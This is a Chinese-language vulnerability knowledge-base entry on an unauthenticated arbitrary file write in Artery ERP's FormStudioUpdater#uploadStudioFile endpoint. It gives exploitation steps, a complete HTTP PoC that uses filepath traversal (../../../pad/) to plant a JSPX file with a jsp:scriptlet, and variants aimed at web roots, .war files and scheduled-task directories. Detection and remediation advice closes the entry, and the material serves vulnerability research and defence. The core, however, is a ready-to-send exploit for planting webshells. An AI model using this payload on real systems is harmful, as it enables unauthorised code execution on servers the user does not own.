---
id: web-generic-file-upload-artery-erp-formstudioupdater-uploadstudiofile
title: Artery ERP FormStudioUpdater#uploadStudioFile 任意文件写入：XML 的 filename/filepath 穿越写 jspx
type: scenario
domain: web
path: web/generic/file-upload
technique: erp-formstudioupdater-uploadstudiofile-xml-write
aliases:
- uploadStudioFile 任意文件写入
- updater.uploadStudioFile
- FormStudioUpdater 写 jspx
- filepath 目录穿越写文件
- ERP 工作室文件写入
tags:
- web
- file-upload
- file-write
- java
- path-traversal
- erp
- unauth
- formservice
- jspx
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V237
  verified_at: '2026-11-07T09:20:30+08:00'
  notes: 已对照原文核对（33 图）；已把 filepath 修正为原文 ../../../pad/；写入成功有响应截图，未验证访问执行；dup-scan pair 1 判读=写不同链，保留。
---

## 一句话结论

ERP 的 `FormStudioUpdater#uploadStudioFile` 通过 FormService 暴露为 `service=updater.uploadStudioFile`，接收 XML 内容并用其中的 `filename` 与 `filepath` 拼接落盘路径；`filepath` 未过滤 `../`，攻击者可把带 `<jsp:scriptlet>` 的 JSPX 文件写到 `../../../pad/` 等任意可写目录，形成任意文件写入/潜在 webshell。

## 原理

- `uploadStudioFile` 是 `FormStudioUpdater` 的 public 方法，第三个参数类型为 `Document`，FormService 以 `contentType=1` 用 SAXReader 把 `content` 解析成 XML DOM。
- 方法从 XML 中读取：
  - `filename`：目标文件名（如 `hello.jspx`）；
  - `filepath`：目标目录（如 `../../../pad/`，可穿越）；
  - `filesize`、`lmtime`：用于校验写入后文件大小与最后修改时间（代码中有 `file.length() != size` 与 `setLastModified` 循环）；
  - XML 其余内容（包括 `<jsp:scriptlet>`）作为文件内容写入。
- 拼接路径时没有规范化/白名单，`filepath` 中的 `../` 可直接跳出工作室根目录；写入内容完全由攻击者 XML 控制，JSPX 本质是 XML 形式的 JSP，被容器解析时执行 `jsp:scriptlet` 中的 Java 代码。
- 由于 `updater` 服务未实现有效的 `isAccessible` 鉴权，整个调用无需登录。

## 触发条件

- 目标部署该 ERP/框架，`/formservice` 可访问，`updater` 服务存在。
- `uploadStudioFile` 为 public 且参数为 (request, response, Document)，方法未被 `isAccessible` 拦截。
- 目标存在可写目录，且写入后的文件可被 Web 容器解析/访问（或可写入启动脚本、计划任务等敏感位置）。
- 攻击者知道目标目录相对层级（可通过报错、`getStudioFile` 泄露的路径或默认安装路径推断）。

## 利用步骤

1. 构造 XML：`<hello xmlns:jsp="http://java.sun.com/JSP/Page"><filename>hello.jspx</filename><filepath>../../../pad/</filepath><filesize>347</filesize><lmtime>2025-05-20 10:30:00</lmtime><jsp:scriptlet>...</jsp:scriptlet></hello>`。
2. 以 `application/x-www-form-urlencoded` 提交 `service=updater.uploadStudioFile&content=<XML>`（URL 编码）。
3. 观察响应 `<root>hello.jspx</root>` 表示写入成功；若返回文件大小/修改时间错误，则调整 `filesize`/`lmtime` 使其匹配实际内容。
4. 访问或包含写入的 JSPX（取决于 `filepath` 是否在 Web 根/可访问目录），执行 `jsp:scriptlet`。
5. 记录请求、响应与文件访问结果；验证后清理。

## PoC

```http
POST /formservice?service=updater.uploadStudioFile HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

service=updater.uploadStudioFile&content=<hello+xmlns%3Ajsp%3D"http%3A//java.sun.com/JSP/Page"><filename>hello.jspx</filename><filepath>../../../pad/</filepath><filesize>347</filesize><lmtime>2025-05-20+10%3A30%3A00</lmtime><jsp%3Ascriptlet>out.println(java.util.UUID.randomUUID().toString())%3Bnew+java.io.File(application.getRealPath(request.getServletPath())).delete()%3B</jsp%3Ascriptlet></hello>
```

响应：`<?xml version="1.0" encoding="utf-8"?><root>hello.jspx</root>`。原文仅证明写入成功，未展示访问 `hello.jspx` 执行。

## 变体与关联

- 变体：把 `filename` 改成 `.jsp`/`.jspx`/`.war` 等；`filepath` 指向 Web 根、Tomcat 临时目录、计划任务目录等。
- 变体：若 `filesize`/`lmtime` 校验严格，可先按目标文件系统精度计算真实大小/时间，或利用写入后 `setLastModified` 的行为满足校验。
- 关联：同系统的上传入口 [[web-generic-file-upload-artery-erp-servletupload-phoneupload]]；同类的文件读取 [[web-generic-file-inclusion-artery-erp-formstudioupdater-getstudiofile]]；FormService 机制 [[web-java-framework-formservice-reflection-dispatch-unauth]]。
- 边界：`filepath` 被规范化/白名单、目标目录不可写、写入文件不被容器解析或无法访问时，webshell 不成立；原文未展示执行结果，confidence 标 medium。

## 检测与防御

- 检测：`/formservice?service=updater.uploadStudioFile` 请求；`content` 中出现 `<filename>`、`<filepath>`、`../`、`jsp:scriptlet`；工作目录/Web 目录出现新 `.jspx` 文件。
- 修复：不要用客户端提供的 `filepath`/`filename` 拼接路径；规范化后强制路径位于工作室根目录内；文件内容按白名单格式校验，禁止 JSPX/脚本内容。
- 加固：FormService 服务方法白名单与 `isAccessible` 鉴权；上传/写入目录禁止脚本解析；文件写入使用随机名并记录审计。
